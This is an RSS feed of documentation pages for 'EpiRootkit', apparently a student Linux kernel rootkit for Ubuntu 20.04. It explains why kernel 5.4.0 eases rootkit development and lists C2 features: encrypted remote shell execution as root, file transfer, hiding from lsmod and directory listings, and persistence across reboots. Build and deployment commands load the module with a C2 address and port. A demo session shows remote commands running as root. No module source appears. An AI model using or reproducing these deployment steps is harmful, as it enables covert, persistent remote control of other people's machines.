<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Tue, 17 Jun 2025 23:52:07 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS (Focal Fossa)&lt;/li>
&lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-26-generic&lt;/li>
&lt;/ul>
&lt;h3 id="why-ubuntu-2004-lts">Why Ubuntu 20.04 LTS? &lt;a href="#why-ubuntu-2004-lts" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>Primary Reason&lt;/strong>: Ubuntu 20.04 ships with kernel 5.4.0-26-generic pre-compiled and ready to use.&lt;/p>
&lt;p>&lt;strong>Additional Benefits&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>Widespread deployment&lt;/li>
&lt;li>5-year LTS support lifecycle (until 31 May 2025&amp;hellip; I&amp;rsquo;m so sad)&lt;/li>
&lt;/ul>
&lt;h3 id="why-kernel-540-specifically">Why Kernel 5.4.0 Specifically? &lt;a href="#why-kernel-540-specifically" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Kernel 5.4.0 sits in a &lt;strong>unique security window&lt;/strong> that makes rootkit development straightforward:&lt;/p>
&lt;h4 id="the-security-timeline">The Security Timeline &lt;a href="#the-security-timeline" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h4>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="867e920" class="language- ">
 &lt;code>5.3.x ← No lockdown mode
5.4.0 ← Lockdown introduced but disabled by default ← WE ARE HERE
5.7.x ← kallsyms_lookup_name() unexported
5.8.x ← UEFI Secure Boot enables lockdown automatically&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Result&lt;/strong>: 5.4.0 provides modern kernel features without the security restrictions that complicate rootkit development.&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/05-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/05-epirootkit/overview/</guid><description>&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection with domain support and XOR encryption&lt;/li>
&lt;li>&lt;strong>DNS Resolution&lt;/strong>: Kernel-space domain name resolution&lt;/li>
&lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
&lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
&lt;li>&lt;strong>XOR Encryption&lt;/strong>: 32-byte key encryption for all C2 traffic&lt;/li>
&lt;li>&lt;strong>Sysfs Interface&lt;/strong>: Linux-native configuration using octal permission system&lt;/li>
&lt;li>&lt;strong>Stealth&lt;/strong>: Hide module from &lt;code>lsmod&lt;/code> and files from directory listings&lt;/li>
&lt;li>&lt;strong>Persistence&lt;/strong>: Multiple mechanisms to survive reboots&lt;/li>
&lt;/ul>
&lt;h2 id="quick-demo">Quick Demo &lt;a href="#quick-demo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="595fb17" class="language-bash ">
 &lt;code># 1. Build and deploy with XOR encryption enabled
cd rootkit &amp;amp;&amp;amp; make
sudo ./deploy_rootkit.sh address=c2.example.com port=443

# 2. Start C2 server 
cd attacking_program &amp;amp;&amp;amp; pnpm start

# 3. Use rootkit (all communication XOR encrypted)
auth Client-1 password
# SUCCESS: Authentication successful

exec Client-1 whoami
# Exit code: 0
# Output: root

status Client-1
# EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR

# 4. Configure via permission bits (feature toggles)
sudo chmod 670 /sys/kernel/epirootkit/control # group rwx = all features enabled
sudo cat /sys/kernel/epirootkit/control # Check status&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Network Layer&lt;/strong>: Connection management and DNS resolution&lt;/li>
&lt;li>&lt;strong>Command System&lt;/strong>: Authentication and remote execution&lt;/li>
&lt;li>&lt;strong>Stealth Features&lt;/strong>: Module and file hiding&lt;/li>
&lt;li>&lt;strong>Persistence&lt;/strong>: Boot survival mechanisms&lt;/li>
&lt;/ul>
&lt;h3 id="communication-flow">Communication Flow &lt;a href="#communication-flow" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="3d8f7f0" class="language- ">
 &lt;code>C2 Server ←→ Network/DNS ←→ EpiRootkit ←→ Linux Kernel
(Node.js) (TCP/UDP) (Module) (System Calls)&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="technical-stack">Technical Stack &lt;a href="#technical-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS, kernel 5.4.0, x86_64&lt;/li>
&lt;li>&lt;strong>Language&lt;/strong>: C (kernel module) + Node.js (C2 server)&lt;/li>
&lt;li>&lt;strong>APIs&lt;/strong>: ftrace, kretprobe, VFS, UDP sockets&lt;/li>
&lt;li>&lt;strong>Network&lt;/strong>: TCP (C2) + UDP (DNS resolution)&lt;/li>
&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key&lt;/li>
&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 with rate limiting (5 attempts/60s)&lt;/li>
&lt;/ul>
&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
&lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
&lt;/ul>
&lt;h3 id="dependencies">Dependencies &lt;a href="#dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="f1f2f46" class="language-bash ">
 &lt;code>sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="build">Build &lt;a href="#build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="using-deploy-script-recommended">Using Deploy Script (Recommended) &lt;a href="#using-deploy-script-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="a874dd3" class="language-bash ">
 &lt;code># Build rootkit using main deployment script
./deploy_c2.sh --rootkit&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="manual-build">Manual Build &lt;a href="#manual-build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="f9e9859" class="language-bash ">
 &lt;code>cd rootkit
make clean &amp;amp;&amp;amp; make
# ✓ Build successful: epirootkit.ko created&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="deployment-script">Deployment Script &lt;a href="#deployment-script" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="49c12a5" class="language-bash ">
 &lt;code># Basic deployment (uses ./epirootkit.ko automatically)
cd rootkit
sudo ./deploy_rootkit.sh

# Custom C2 server
sudo ./deploy_rootkit.sh -a 192.168.200.11 -p 4444

# Domain-based deployment 
sudo ./deploy_rootkit.sh -a c2.example.com

# Custom module file
sudo ./deploy_rootkit.sh -m /path/to/epirootkit.ko&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="deployment-commands">Deployment Commands &lt;a href="#deployment-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Command&lt;/th>
 &lt;th>Description&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;code>deploy&lt;/code>&lt;/td>
 &lt;td>Install and load module (default)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>status&lt;/code>&lt;/td>
 &lt;td>Check current module status&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>uninstall&lt;/code>&lt;/td>
 &lt;td>Remove module completely&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>help&lt;/code>&lt;/td>
 &lt;td>Show detailed help&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h3 id="deployment-options">Deployment Options &lt;a href="#deployment-options" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Option&lt;/th>
 &lt;th>Description&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;code>-m, --module FILE&lt;/code>&lt;/td>
 &lt;td>Specify module file (default: ./epirootkit.ko)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>-a, --address ADDR&lt;/code>&lt;/td>
 &lt;td>C2 server address (default: 192.168.200.11)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>-p, --port PORT&lt;/code>&lt;/td>
 &lt;td>C2 server port (default: 4444)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>-h, --help&lt;/code>&lt;/td>
 &lt;td>Show help message&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h3 id="advanced-usage">Advanced Usage &lt;a href="#advanced-usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="15498ab" class="language-bash ">
 &lt;code># Custom deployment with domain
sudo ./deploy_rootkit.sh -a c2.example.com -p 443

# Check deployment status
sudo ./deploy_rootkit.sh status
# Module is loaded and visible
# OR: Module is loaded and hidden (stealth mode active)

# Remove deployment
sudo ./deploy_rootkit.sh uninstall
# Module uninstalled&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="manual-loading-alternative">Manual Loading (Alternative) &lt;a href="#manual-loading-alternative" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="5967864" class="language-bash ">
 &lt;code># Load with domain 
sudo insmod epirootkit.ko address=c2.example.com

# Load with IP and port
sudo insmod epirootkit.ko address=192.168.200.11 port=4444

# Load with defaults from config
sudo insmod epirootkit.ko&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="module-status-detection">Module Status Detection &lt;a href="#module-status-detection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script can detect module status even when hidden:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
&lt;ol>
&lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
&lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) - see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p>&lt;strong>DNS Resolution&lt;/strong>&lt;br>Kernel-space DNS client for domain-based C2 communication&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/dns-resolution/">DNS Resolution&lt;/a>&lt;/li>
&lt;li>&lt;strong>Attempts TCP connection&lt;/strong> to configured C2 server&lt;/li>
&lt;li>&lt;strong>Begins keepalive system&lt;/strong> (60-second ping/pong)&lt;/li>
&lt;li>&lt;strong>Enables XOR encryption&lt;/strong> for all C2 communication&lt;/li>
&lt;li>&lt;strong>Handles reconnection&lt;/strong> with exponential backoff&lt;/li>
&lt;/ol>
&lt;h3 id="configuration-with-domain-support">Configuration with Domain Support &lt;a href="#configuration-with-domain-support" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="e296234" class="language-c ">
 &lt;code>// rootkit/core/config.h - Domain examples
#define C2_SERVER_ADDRESS &amp;#34;jules_chef_de_majeur.epirootkit.com&amp;#34; // Domain name
#define C2_SERVER_PORT 4444
#define KEEPALIVE_INTERVAL_MS 60000
#define RECONNECT_DELAY_MS 5000

// Or traditional IP
#define C2_SERVER_ADDRESS &amp;#34;192.168.64.1&amp;#34; // IP address
#define C2_SERVER_PORT 4444&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="runtime-parameters">Runtime Parameters &lt;a href="#runtime-parameters" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Override config.h settings during deployment:&lt;/p></description></item></channel></rss>